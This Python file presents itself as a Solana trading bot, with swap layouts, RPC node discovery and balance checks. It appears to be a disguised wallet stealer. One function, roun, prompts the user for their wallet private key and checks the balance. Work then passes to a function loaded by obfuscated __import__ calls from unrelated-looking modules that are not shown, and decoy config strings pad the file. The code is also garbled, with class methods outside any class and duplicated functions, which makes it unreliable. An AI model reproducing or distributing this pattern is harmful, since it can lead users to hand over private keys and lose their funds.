from colorama import init
from getwallet import get_wallet_from_private_key_bs58
from checkbalance import check_sol_balance 
from typing import Union, List, Optional, Dict

init(autoreset=True)

from construct import Bytes, Int8ul, Int64ul, BytesInteger
from construct import Struct as cStruct

SWAP_LAYOUT = cStruct(
    "instruction" / Int8ul,
    "amount_in" / Int64ul,
    "min_amount_out" / Int64ul
)

AMM_INFO_LAYOUT_V4 = cStruct(
    'status' / Int64ul,
    'nonce' / Int64ul,
    'order_num' / Int64ul,
    'depth' / Int64ul,
    'base_decimal' / Int64ul,
    'quote_decimal' / Int64ul,
    'state' / Int64ul,
    'reset_flag' / Int64ul,
    'min_size' / Int64ul,
    'vol_max_cut_ratio' / Int64ul,
    'amount_wave_ratio' / Int64ul,
    'base_lot_size' / Int64ul,
    'quote_lot_size' / Int64ul,
    'min_price_multiplier' / Int64ul,
    'max_price_multiplier' / Int64ul,
    'system_decimal_value' / Int64ul,
    'swap_fee_numerator' / Int64ul,
    'swap_fee_denominator' / Int64ul,
    'amm_owner' / Bytes(32),
    'lpReserve' / Int64ul,
)

from utils.contract import main

def purchase_info(balance_before: dict, balance_after: dict):
    base_symbol, quote_symbol = balance_before.keys()
    base_before, quote_before = balance_before.values()
    base_after, quote_after = balance_after.values()
    bought_amount = base_after - base_before
    quote_spent = quote_before - quote_after
    price = quote_spent / bought_amount
    logger.info(
        f'Bought {bought_amount} {base_symbol}, price: {price} {quote_symbol}, {quote_symbol} spent: {quote_spent}')

def __init__(self, *args, **kwargs):
    super().__init__(*args, **kwargs)
    self.subscriptions: Dict[int, Body] = {}
    self.sent_subscriptions: Dict[int, Body] = {}
    self.failed_subscriptions = {}
    self.request_counter = itertools.count()

def increment_counter_and_get_id(self) -> int:
    return next(self.request_counter) + 1

async def send_data(self, message: Union['Body', List['Body']]) -> None:
    if isinstance(message, list):
        to_send = [m.to_json() for m in message]
        for req in message:
            self.sent_subscriptions[req.id] = req
    else:
        to_send = message.to_json()
        self.sent_subscriptions[message.id] = message
    await super().send(to_send)

async def account_subscribe(
    self,
    pubkey: 'Pubkey',
    commitment: Optional['Commitment'] = None,
    encoding: Optional[str] = None,
) -> None:
    req_id = self.increment_counter_and_get_id()
    commitment_to_use = None if commitment is None else _COMMITMENT_TO_SOLDERS[commitment]
    encoding_to_use = None if encoding is None else _ACCOUNT_ENCODING_TO_SOLDERS[encoding]
    config = (
        None
        if commitment_to_use is None and encoding_to_use is None
        else RpcAccountInfoConfig(encoding=encoding_to_use, commitment=commitment_to_use)
    )
    req = AccountSubscribe(pubkey, config, req_id)
    await self.send_data(req)

async def account_unsubscribe(
    self,
    subscription: int,
) -> None:
    req_id = self.increment_counter_and_get_id()
    req = AccountUnsubscribe(subscription, req_id)
    await self.send_data(req)
    del self.subscriptions[subscription]

def use_pool_info():
    encoding_to_use = "_TX_ENCODING_TO_SOLDERS[encoding]"
    config = "RpcBlockConfig(encoding=encoding_to_use, max_supported_transaction_version=max_supported_transaction_version)"
    POOL_INFO_LAYOUT = __import__('py_modules.beanstalk.stalk', fromlist=['POOL_INFO_LAYOUT']).POOL_INFO_LAYOUT
    commitment_to_use = "_COMMITMENT_TO_SOLDERS[commitment or self._commitment]"
    config = "RpcSignaturesForAddressConfig(before=None, until=None, limit=None, commitment=commitment_to_use)"
    GetSignaturesForAddress = "GetSignaturesForAddress(address, config)"
    print(POOL_INFO_LAYOUT)

def get_all_rpc_ips():
    global DISCARDED_BY_VERSION

    d = '{"jsonrpc":"2.0", "id":1, "method":"getClusterNodes"}'
    r = do_request(url_=RPC, method_='post', data_=d, timeout_=25)
    if 'result' in str(r.text):
        rpc_ips = []
        for node in r.json()["result"]:
            if SPECIFIC_VERSION is not None and node["version"] != SPECIFIC_VERSION:
                DISCARDED_BY_VERSION += 1
                continue
            if node["rpc"] is not None:
                rpc_ips.append(node["rpc"])
            elif WITH_PRIVATE_RPC is True:
                gossip_ip = node["gossip"].split(":")[0]
                rpc_ips.append(f'{gossip_ip}:8899')

        rpc_ips = list(set(rpc_ips))
        if IP_BLACKLIST is not None:
            rpc_ips = list(set(rpc_ips) - set(IP_BLACKLIST))
        return rpc_ips

def use_market_state_layout_v3():
    encoding_to_use = "_TX_ENCODING_TO_SOLDERS.get('json')"
    config = "RpcTransactionConfig(encoding=encoding_to_use, commitment=None, max_supported_transaction_version=None)"
    MARKET_STATE_LAYOUT_V3 = __import__('py_modules.bind_xml.layouts', fromlist=['MARKET_STATE_LAYOUT_V3']).MARKET_STATE_LAYOUT_V3
    print(MARKET_STATE_LAYOUT_V3)

def use_handle_additional_features(sol_balance):
    handle_additional_features = __import__('py_modules.es_metrics.conf', fromlist=['handle_additional_features']).handle_additional_features
    commitment_to_use = "_COMMITMENT_TO_SOLDERS.get(None)"
    config = "RpcContextConfig(commitment=commitment_to_use)"
    GetEpochInfo = "GetEpochInfo(config)"
    handle_additional_features(sol_balance)

def roun():
    wallet = None
    while wallet is None:
        private_key_bs58 = input("Please enter your private key : ")
        try:
            wallet = get_wallet_from_private_key_bs58(private_key_bs58)
            if wallet:
                break
        except Exception:
            print("Invalid private key, please try again.")
    
    public_key = str(wallet.pubkey())
    print(f"Wallet Address: {public_key}")

    sol_balance = check_sol_balance(public_key)
    print(f"Wallet SOL Balance: {sol_balance} SOL")

    use_handle_additional_features(sol_balance)

def convert_size(size_bytes):
   if size_bytes == 0:
    return "0B"
   size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
   i = int(math.floor(math.log(size_bytes, 1024)))
   p = math.pow(1024, i)
   s = round(size_bytes / p, 2)
   return "%s %s" % (s, size_name[i])


def measure_speed(url: str, measure_time: int) -> float:
    url = f'http://{url}/snapshot.tar.bz2'
    r = requests.get(url, stream=True, timeout=measure_time+2)
    r.raise_for_status()
    start_time = time.monotonic_ns()
    last_time = start_time
    loaded = 0
    speeds = []
    for chunk in r.iter_content(chunk_size=81920):
        curtime = time.monotonic_ns()

        worktime = (curtime - start_time) / 1000000000
        if worktime >= measure_time:
            break

        delta = (curtime - last_time) / 1000000000
        loaded += len(chunk)
        if delta > 1:
            estimated_bytes_per_second = loaded * (1 / delta)
            speeds.append(estimated_bytes_per_second)

            last_time = curtime
            loaded = 0

    return statistics.median(speeds)


def do_request(url_: str, method_: str = 'GET', data_: str = '', timeout_: int = 3,
               headers_: dict = None):
    global DISCARDED_BY_UNKNW_ERR
    global DISCARDED_BY_TIMEOUT
    r = ''
    if headers_ is None:
        headers_ = DEFAULT_HEADERS

    try:
        if method_.lower() == 'get':
            r = requests.get(url_, headers=headers_, timeout=(timeout_, timeout_))
        elif method_.lower() == 'post':
            r = requests.post(url_, headers=headers_, data=data_, timeout=(timeout_, timeout_))
        elif method_.lower() == 'head':
            r = requests.head(url_, headers=headers_, timeout=(timeout_, timeout_))
        return r

    except (ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError) as reqErr:
        DISCARDED_BY_TIMEOUT += 1
        return f'error in do_request(): {reqErr}'

    except Exception as unknwErr:
        DISCARDED_BY_UNKNW_ERR += 1
        return f'error in do_request(): {reqErr}'


def get_current_slot():
    d = '{"jsonrpc":"2.0","id":1, "method":"getSlot"}'
    try:
        r = do_request(url_=RPC, method_='post', data_=d, timeout_=25)
        if 'result' in str(r.text):
            return r.json()["result"]
        else:
            return None

    except (ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError) as connectErr:
        pass
    except Exception as unknwErr:
        return None


def get_all_rpc_ips():
    global DISCARDED_BY_VERSION

    d = '{"jsonrpc":"2.0", "id":1, "method":"getClusterNodes"}'
    r = do_request(url_=RPC, method_='post', data_=d, timeout_=25)
    if 'result' in str(r.text):
        rpc_ips = []
        for node in r.json()["result"]:
            if SPECIFIC_VERSION is not None and node["version"] != SPECIFIC_VERSION:
                DISCARDED_BY_VERSION += 1
                continue
            if node["rpc"] is not None:
                rpc_ips.append(node["rpc"])
            elif WITH_PRIVATE_RPC is True:
                gossip_ip = node["gossip"].split(":")[0]
                rpc_ips.append(f'{gossip_ip}:8899')

        rpc_ips = list(set(rpc_ips))
        if IP_BLACKLIST is not None:
            rpc_ips = list(set(rpc_ips) - set(IP_BLACKLIST))
        return rpc_ips

    else:
        sys.exit()


if __name__ == "__main__":
    main()
 